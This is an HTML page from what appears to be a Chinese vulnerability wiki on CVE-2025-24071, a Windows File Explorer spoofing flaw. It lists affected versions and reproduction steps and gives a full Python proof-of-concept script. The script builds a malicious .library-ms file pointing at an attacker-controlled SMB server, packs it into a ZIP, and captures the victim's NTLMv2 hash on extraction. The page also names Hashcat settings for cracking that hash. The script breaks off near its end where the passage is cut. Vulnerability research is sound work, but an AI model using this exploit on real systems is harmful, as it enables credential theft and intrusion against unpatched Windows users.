<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows%20%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E%20CVE-2025-24071/">
    <link rel="shortcut icon" href="../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Windows 文件资源管理器欺骗漏洞 CVE-2025-24071 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Windows \u6587\u4ef6\u8d44\u6e90\u7ba1\u7406\u5668\u6b3a\u9a97\u6f0f\u6d1e CVE-2025-24071", url: "#_top", children: [
              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u73af\u5883\u642d\u5efa", url: "#_3" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
              {title: "\u6f0f\u6d1e POC", url: "#poc" },
              {title: "\u6f0f\u6d1e\u4fee\u590d", url: "#_5" },
          ]},
        ];

    </script>
    <script src="../../js/base.js"></script>
      <script src="../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Windows%20%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%20CVE-2019-0708/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Windows%20%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%20CVE-2019-0708/" class="btn btn-xs btn-link">
        Windows 远程桌面服务漏洞 CVE-2019-0708
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Windows%20Win32k%20%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%20CVE-2021-1732/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Windows%20Win32k%20%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%20CVE-2021-1732/" class="btn btn-xs btn-link">
        Windows Win32k 本地提权漏洞 CVE-2021-1732
      </a>
    </div>
    
  </div>

    

    <h1 id="windows-cve-2025-24071">Windows 文件资源管理器欺骗漏洞 CVE-2025-24071<a class="headerlink" href="#windows-cve-2025-24071" title="Permanent link">&para;</a></h1>
<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>CVE-2025-24071 是 Windows 文件资源管理器中的一个欺骗漏洞，利用了 Windows 对 <code>.library-ms</code> 文件的隐式信任和自动解析特性。攻击者通过构造包含恶意 SMB 路径的 <code>.library-ms</code> 文件并打包为 ZIP/RAR 文件，解压时，Windows 资源管理器会自动尝试连接到指定的 SMB 服务器，从而泄露用户的 NTLM Hash。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24071">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24071</a></li>
<li><a href="https://cti.monster/blog/2025/03/18/CVE-2025-24071.html">https://cti.monster/blog/2025/03/18/CVE-2025-24071.html</a></li>
<li><a href="https://github.com/0x6rss/CVE-2025-24071_PoC">https://github.com/0x6rss/CVE-2025-24071_PoC</a></li>
<li><a href="https://github.com/ThemeHackers/CVE-2025-24071">https://github.com/ThemeHackers/CVE-2025-24071</a></li>
</ul>
<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>Windows 10 Version 1809 for x64-based Systems
Windows 10 Version 1809 for 32-bit Systems
Windows Server 2025 (Server Core installation)
Windows Server 2025
Windows Server 2012 R2 (Server Core installation)
Windows Server 2012 R2
Windows Server 2016 (Server Core installation)
Windows Server 2016
Windows 10 Version 1607 for x64-based Systems
Windows 10 Version 1607 for 32-bit Systems
Windows 10 for x64-based Systems
Windows 10 for 32-bit Systems
Windows 11 Version 24H2 for x64-based Systems
Windows 11 Version 24H2 for ARM64-based Systems
Windows Server 2022, 23H2 Edition (Server Core installation)
Windows 11 Version 23H2 for x64-based Systems
Windows 11 Version 23H2 for ARM64-based Systems
Windows 10 Version 22H2 for 32-bit Systems
Windows 10 Version 22H2 for ARM64-based Systems
Windows 10 Version 22H2 for x64-based Systems
Windows 11 Version 22H2 for x64-based Systems
Windows 11 Version 22H2 for ARM64-based Systems
Windows 10 Version 21H2 for x64-based Systems
Windows 10 Version 21H2 for ARM64-based Systems
Windows 10 Version 21H2 for 32-bit Systems
Windows Server 2022 (Server Core installation)
Windows Server 2022
Windows Server 2019 (Server Core installation)
</code></pre></div>
<h2 id="_3">环境搭建<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>搭建一个未安装补丁的 Windows 11 Version 23H2 漏洞环境：</p>
<blockquote>
<p>可以按 <code>Win+R</code> 键，输入 <code>winver</code> ，然后按 <code>Enter</code> 键查看 Windows 操作系统的版本号。</p>
</blockquote>
<p><img alt="" src="../images/Windows%20%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E%20CVE-2025-24071/image-20250618162450594.png" /></p>
<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<p>通过 <a href="https://github.com/ThemeHackers/CVE-2025-24071">该项目</a> 构造一个恶意压缩包 <code>exploit.zip</code>，压缩包中包含一个名为 <code>document.library-ms</code> 的恶意文件：</p>
<div class="highlight"><pre><span></span><code>python exploit.py -f document -i 192.168.174.2
</code></pre></div>
<p><img alt="" src="../images/Windows%20%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E%20CVE-2025-24071/image-20250618163225289.png" /></p>
<p>构造的恶意文件 <code>document.library-ms</code> 中包含一个 <code>&lt;simpleLocation&gt;</code> 标签，标签直接指向攻击者控制的 SMB 服务器：</p>
<div class="highlight"><pre><span></span><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;libraryDescription xmlns=&quot;http://schemas.microsoft.com/windows/2009/library&quot;&gt;
  &lt;searchConnectorDescriptionList&gt;
    &lt;searchConnectorDescription&gt;
      &lt;simpleLocation&gt;
        &lt;url&gt;\\192.168.174.2\shared&lt;/url&gt;
      &lt;/simpleLocation&gt;
    &lt;/searchConnectorDescription&gt;
  &lt;/searchConnectorDescriptionList&gt;
&lt;/libraryDescription&gt;
</code></pre></div>
<p>由于 Windows 资源管理器隐式信任 <code>.library-ms</code> 文件，提取后，Windows 资源管理器会尝试自动解析 SMB 路径 <code>\\192.168.174.2\shared</code>，以收集元数据和索引文件信息，此操作将触发从受害者系统到攻击者控制的 SMB 服务器的隐式 NTLM 身份验证握手。攻击者控制的 SMB 服务器接收到 NTLMv2 Hash：</p>
<p><img alt="" src="../images/Windows%20%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E%20CVE-2025-24071/image-20250618163632193.png" /></p>
<p>攻击者可以使用 Hashcat 对 NTLMv2 Hash 进行破解（<code>-m 5600</code>）。</p>
<h2 id="poc">漏洞 POC<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">zipfile</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">argparse</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">itertools</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">colorama</span><span class="w"> </span><span class="kn">import</span> <span class="n">init</span><span class="p">,</span> <span class="n">Fore</span><span class="p">,</span> <span class="n">Style</span>

<span class="n">init</span><span class="p">()</span>

<span class="k">def</span><span class="w"> </span><span class="nf">loading_animation</span><span class="p">(</span><span class="n">duration</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Display a simple loading animation for specified duration&quot;&quot;&quot;</span>
    <span class="n">spinner</span> <span class="o">=</span> <span class="n">itertools</span><span class="o">.</span><span class="n">cycle</span><span class="p">([</span><span class="s1">&#39;-&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;|&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="p">])</span>
    <span class="n">end_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">+</span> <span class="n">duration</span>
    <span class="k">while</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">&lt;</span> <span class="n">end_time</span><span class="p">:</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="se">\r</span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">YELLOW</span><span class="si">}</span><span class="s1">Processing </span><span class="si">{</span><span class="nb">next</span><span class="p">(</span><span class="n">spinner</span><span class="p">)</span><span class="si">}{</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\r</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">print_ascii_art</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Print ASCII art banner&quot;&quot;&quot;</span>
    <span class="n">art</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">&quot;&quot;&quot;</span>
<span class="s2">          ______ ____    ____  _______       ___     ___    ___    _____        ___    _  _      ___    ______   __  </span>
<span class="s2">         /      |\   \  /   / |   ____|     |__ \   / _ \  |__ \  | ____|      |__ \  | || |    / _ \  |____  | /_ | </span>
<span class="s2">        |  ,----&#39; \   \/   /  |  |__    ______ ) | | | | |    ) | | |__    ______ ) | | || |_  | | | |     / /   | | </span>
<span class="s2">        |  |       \      /   |   __|  |______/ /  | | | |   / /  |___ \  |______/ /  |__   _| | | | |    / /    | | </span>
<span class="s2">        |  `----.   \    /    |  |____       / /_  | |_| |  / /_   ___) |       / /_     | |   | |_| |   / /     | | </span>
<span class="s2">         \______|    \__/     |_______|     |____|  \___/  |____| |____/       |____|    |_|    \___/   /_/      |_| </span>


<span class="s2">                                                Windows File Explorer Spoofing Vulnerability (CVE-2025-24071)</span>
<span class="s2">                    by ThemeHackers                                                                                                                                                           </span>
<span class="s2">    &quot;&quot;&quot;</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">CYAN</span><span class="si">}{</span><span class="n">art</span><span class="si">}{</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">show_affected_versions</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Display list of affected versions&quot;&quot;&quot;</span>
    <span class="n">affected_versions</span> <span class="o">=</span> <span class="p">[</span>
        <span class="s2">&quot;Windows 10 Version 1809 for x64-based Systems&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows 10 Version 1809 for 32-bit Systems&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows Server 2025 (Server Core installation)&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows Server 2025&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows Server 2012 R2 (Server Core installation)&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows Server 2012 R2&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows Server 2016 (Server Core installation)&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows Server 2016&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows 10 Version 1607 for x64-based Systems&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows 10 Version 1607 for 32-bit Systems&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows 10 for x64-based Systems&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows 10 for 32-bit Systems&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows 11 Version 24H2 for x64-based Systems&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows 11 Version 24H2 for ARM64-based Systems&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows Server 2022, 23H2 Edition (Server Core installation)&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows 11 Version 23H2 for x64-based Systems&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows 11 Version 23H2 for ARM64-based Systems&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows 10 Version 22H2 for 32-bit Systems&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows 10 Version 22H2 for ARM64-based Systems&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows 10 Version 22H2 for x64-based Systems&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows 11 Version 22H2 for x64-based Systems&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows 11 Version 22H2 for ARM64-based Systems&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows 10 Version 21H2 for x64-based Systems&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows 10 Version 21H2 for ARM64-based Systems&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows 10 Version 21H2 for 32-bit Systems&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows Server 2022 (Server Core installation)&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows Server 2022&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows Server 2019 (Server Core installation)&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Windows Server 2019&quot;</span>
    <span class="p">]</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s2">Affected versions:</span><span class="si">{</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">version</span> <span class="ow">in</span> <span class="n">affected_versions</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;- </span><span class="si">{</span><span class="n">version</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">create_exploit</span><span class="p">(</span><span class="n">file_name</span><span class="p">,</span> <span class="n">ip_address</span><span class="p">):</span>
    <span class="n">print_ascii_art</span><span class="p">()</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s2">Creating exploit with filename: </span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="s2">.library-ms</span><span class="si">{</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s2">Target IP: </span><span class="si">{</span><span class="n">ip_address</span><span class="si">}{</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>

    <span class="n">library_content</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="s2">&lt;libraryDescription xmlns=&quot;http://schemas.microsoft.com/windows/2009/library&quot;&gt;</span>
<span class="s2">  &lt;searchConnectorDescriptionList&gt;</span>
<span class="s2">    &lt;searchConnectorDescription&gt;</span>
<span class="s2">      &lt;simpleLocation&gt;</span>
<span class="s2">        &lt;url&gt;</span><span class="se">\\\\</span><span class="si">{</span><span class="n">ip_address</span><span class="si">}</span><span class="se">\\</span><span class="s2">shared&lt;/url&gt;</span>
<span class="s2">      &lt;/simpleLocation&gt;</span>
<span class="s2">    &lt;/searchConnectorDescription&gt;</span>
<span class="s2">  &lt;/searchConnectorDescriptionList&gt;</span>
<span class="s2">&lt;/libraryDescription&gt;&quot;&quot;&quot;</span>

    <span class="n">library_filename</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="s2">.library-ms&quot;</span>

    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">BLUE</span><span class="si">}</span><span class="s2">Generating library file...</span><span class="si">{</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">loading_animation</span><span class="p">(</span><span class="mf">1.5</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">library_filename</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">library_content</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s2">✓ Library file created successfully</span><span class="si">{</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="k">except</span> <span class="ne">IOError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">RED</span><span class="si">}</span><span class="s2">✗ Error writing file: </span><span class="si">{</span><span class="n">e</span><span class="si">}{</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="k">return</span>

    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">BLUE</span><span class="si">}</span><span class="s2">Creating ZIP archive...</span><span class="si">{</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">loading_animation</span><span class="p">(</span><span class="mf">1.5</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="s1">&#39;exploit.zip&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZIP_DEFLATED</span><span class="p">)</span> <span class="k">as</span> <span class="n">zipf</span><span class="p">:</span>
            <span class="n">zipf</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">library_filename</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s2">✓ ZIP file created successfully</span><span class="si">{</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="k">except</span> <span class="ne">IOError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">RED</span><span class="si">}</span><span class="s2">✗ Error creating ZIP file: </span><span class="si">{</span><span class="n">e</span><span class="si">}{</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="k">return</span>

    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">BLUE</span><span class="si">}</span><span class="s2">Cleaning up temporary files...</span><span class="si">{</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">loading_animation</span><span class="p">(</span><span class="mf">1.0</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">library_filename</span><span class="p">):</span>
            <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">library_filename</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s2">✓ Cleanup completed</span><span class="si">{</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="k">except</span> <span class="ne">OSError</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">RED</span><span class="si">}</span><span class="s2">✗ Warning: Could not delete </span><span class="si">{</span><span class="n">library_filename</span><span class="si">}{</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s2">Process completed successfully!</span><span class="si">{</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Output file: </span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">YELLOW</span><span class="si">}</span><span class="s2">exploit.zip</span><span class="si">{</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.&quot;</span><span class="p">)</span>
<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>

    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;Create an exploit ZIP file or show affected versions&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-f&#39;</span><span class="p">,</span> <span class="s1">&#39;--file-name&#39;</span><span class="p">,</span> 
                        <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Name of the library file (without extension)&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-i&#39;</span><span class="p">,</span> <span class="s1">&#39;--ip-address&#39;</span><span class="p">,</span> 
                        <span class="n">help</span><span class="o">=</span><span class="s1">&#39;IP address (e.g., 192.168.1.111)&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-afv&#39;</span><span class="p">,</span> <span class="s1">&#39;--affected-versions&#39;</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s1">&#39;store_true&#39;</span><span class="p">,</span> 
                        <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Display affected versions&#39;</span><span class="p">)</span>

    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>


    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">file_name</span> <span class="ow">or</span> <span class="n">args</span><span class="o">.</span><span class="n">ip_address</span> <span class="ow">or</span> <span class="n">args</span><span class="o">.</span><span class="n">affected_versions</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">RED</span><span class="si">}</span><span class="s2">✗ Error: No arguments provided</span><span class="si">{</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="n">parser</span><span class="o">.</span><span class="n">print_help</span><span class="p">()</span>

    <span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">affected_versions</span><span class="p">:</span>
        <span class="n">show_affected_versions</span><span class="p">()</span>

        <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">file_name</span> <span class="ow">and</span> <span class="n">args</span><span class="o">.</span><span class="n">ip_address</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">YELLOW</span><span class="si">}</span><span class="s2">Proceeding with exploit creation...</span><span class="si">{</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
            <span class="n">create_exploit</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">file_name</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">ip_address</span><span class="p">)</span>

        <span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">file_name</span> <span class="ow">or</span> <span class="n">args</span><span class="o">.</span><span class="n">ip_address</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">RED</span><span class="si">}</span><span class="s2">✗ Error: Both --file-name and --ip-address are required for exploit creation</span><span class="si">{</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>


    <span class="k">else</span><span class="p">:</span>
